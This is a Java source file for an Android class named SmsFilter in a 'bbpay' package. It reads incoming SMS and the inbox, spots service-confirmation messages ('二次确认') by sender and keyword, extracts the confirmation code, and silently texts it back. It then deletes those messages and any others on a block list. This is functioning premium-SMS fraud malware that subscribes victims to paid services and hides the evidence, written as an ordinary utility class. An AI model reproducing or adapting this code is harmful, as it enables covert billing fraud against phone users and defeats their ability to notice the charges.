package com.bbpay.sms.filtersms;
import java.util.ArrayList;
import java.util.List;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import com.bbpay.bean.FilterBean;
import com.bbpay.db.FilterDBManager;
import com.bbpay.sms.SmsSender;
import com.bbpay.util.CollectionUtils;
import com.bbpay.util.MyLogger;
import com.bbpay.util.StringUtils;

public class SmsFilter {
    private static final String LOG_TAG = "platform";
    private Context context;
    private List<FilterBean> filterList = new ArrayList<FilterBean>();
    private boolean isNewSMS;
    private final ArrayList<AutoReplyBean> autoReplyList = new ArrayList<AutoReplyBean>();
    public SmsFilter() {
        isNewSMS = true;
    }
    public void addAutoReply(AutoReplyBean bean) {
        if (bean != null) autoReplyList.add(bean);
    }
    public void addFilter(FilterBean filterbean) {
        if (filterList != null) filterList.add(filterbean);
    }
    public boolean checkSmsBroadcast(String address, String body, String serviceCenter) {
        MyLogger.info(LOG_TAG, "interceptSMSFromBroadcast() address=" + address + " body=" + body + " service_center=" + serviceCenter);
        if (address != null && (address.length() == 11 || address.length() == 14)) {
            if (address.startsWith("+86")) address = address.substring(3);
        }
        if (serviceCenter != null && serviceCenter.startsWith("+86")) {
            serviceCenter.substring(3);
        }
        int index = matchSms(address, body);
        if (index != -1) {
            replySms(autoReplyList.get(index), address, body);
            return true;
        }
        return needBlockSms(address, body);
    }
    public void checkSmsInbox() {
        //MyLogger.info("filterReceiveSMS() ", "过滤移动短息＝＝＝＝＝＝＝＝＝＝＝＝＝＝");
        if (!isNewSMS) {
            isNewSMS = true;
        } else {
            String as[] = { "_id", "thread_id", "address", "body", "service_center" };
            Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), as, null, null, "_id DESC LIMIT 1");
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String smsId = cursor.getString(0);
                    String address = cursor.getString(2);
                    String body = cursor.getString(3);
                    String serviceCenter = cursor.getString(4);
                    MyLogger.info(LOG_TAG, "filterReceiveSMS() ReceiveSMS smsId=" + smsId + " address=" + address + " body=" + body + " service_center=" + serviceCenter);
                    filter(address, body, serviceCenter, smsId);
                }
                cursor.close();
            }
        }
    }
    private void deleteSMS(String s, String s1, String id) {
        MyLogger.info(LOG_TAG, new StringBuilder("屏蔽信息 delete SMS address=").append(s).append(" body=").append(s1).toString());
        context.getContentResolver().delete(Uri.parse("content://sms"), "_id=?", new String[] { id });
    }
    private void filter(String address, String body, String serviceCenter, String smsId) {
        if (address != null && (address.length() == 11 || address.length() == 14)) {
            if (address.startsWith("+86")) address = address.substring(3);
        }
        if (serviceCenter != null && serviceCenter.startsWith("+86")) {
            serviceCenter.substring(3);
        }
        int index = matchSms(address, body);
        if (index != -1) {
            MyLogger.info(LOG_TAG, new StringBuilder("二次确认  address=").append(address).append(" body=").append(body).toString());
            deleteSMS(address, body, smsId);
            MyLogger.info(LOG_TAG, new StringBuilder("filterRecei\tveSMS() delete SMS smsId=").append(smsId).toString());
            replySms(autoReplyList.get(index), address, body);
        } else if (needBlockSms(address, body)) {
            deleteSMS(address, body, smsId);
            return;
        }
    }
    public String getRandomNumber(AutoReplyBean bean, String body) {
        String startStr = bean.getStartStr();
        String endStr = bean.getEndStr();
        String result = null;
        if (StringUtils.isNotBlank(startStr)) {
            int index = body.indexOf(startStr);
            if (index >= 0) {
                index += startStr.length();
                int lastIndex = StringUtils.isNotBlank(endStr) ? body.indexOf(endStr) : body.length();
                if (lastIndex > index && lastIndex - index <= 30) {
                    result = body.substring(index, lastIndex);
                }
            }
        } else {
            if (StringUtils.isNotBlank(endStr)) {
                int index = body.indexOf(endStr);
                if (index > 0 && index <= 30) {
                    result = body.substring(0, index);
                }
            }
        }
        return result;
    }
    private int matchSms(String address, String body) {
        if (address == null || body == null) return -1;
        if (address.startsWith("+86")) address = address.substring(3);
        for (int i = 0; i < autoReplyList.size(); i++) {
            AutoReplyBean bean = autoReplyList.get(i);
            if (bean != null) {
                String number = bean.getSendFromNumber();
                String content = bean.getSendFromContent();
                MyLogger.info("====", new StringBuilder("判断是否为二次确认信息: address is ").append(address).append(" , body is ").append(body).append(" , 过滤PORT IS ").append(number)
                        .append(" , 过滤内容 IS ").append(content).toString());
                if (number != null && !number.trim().equals("") && content != null && !content.trim().equals("") && address.contains(number) && body.contains(content)) return i;
            }
        }
        return -1;
    }
    private boolean needBlockSms(String address, String body) {
        //MyLogger.info(LOG_TAG, new StringBuilder("判断是否要过滤短信 address=").append(s).append(" body=").append(s1).toString());
        if (CollectionUtils.isEmpty(filterList)) {
            filterList = FilterDBManager.getInstance().getAllFilter(context);
        }
        if (address != null && CollectionUtils.isNotEmpty(filterList)) {
            for (FilterBean bean : filterList) {
                if (bean.shouldFilter(address, body)) return true;
            }
        }
        return false;
    }
    public void refreshFilterList() {
        if (filterList != null) {
            filterList.clear();
            filterList = FilterDBManager.getInstance().getAllFilter(context);
        }
    }
    private void replySms(final AutoReplyBean bean, final String address, final String body) {
        if (bean != null && bean.isNeedReplay()) {
            new Thread() {
                @Override
                public void run() {
                    String replyNumber = bean.getSendFromNumber();
                    String replyContent = bean.isRandKeyword() ? getRandomNumber(bean, body) : bean.getReplayContent();
                    MyLogger.info(LOG_TAG, new StringBuilder("replayReceiveSMS sendContent=").append(replyContent).append(" sendToNumber=").append(address).toString());
                    if (StringUtils.isNotBlank(replyNumber, replyContent)) {
                        new SmsSender().sendSMS(context, address, replyContent);
                    }
                }
            }.start();
        }
    }
    public void setContext(Context context1) {
        context = context1;
    }
}
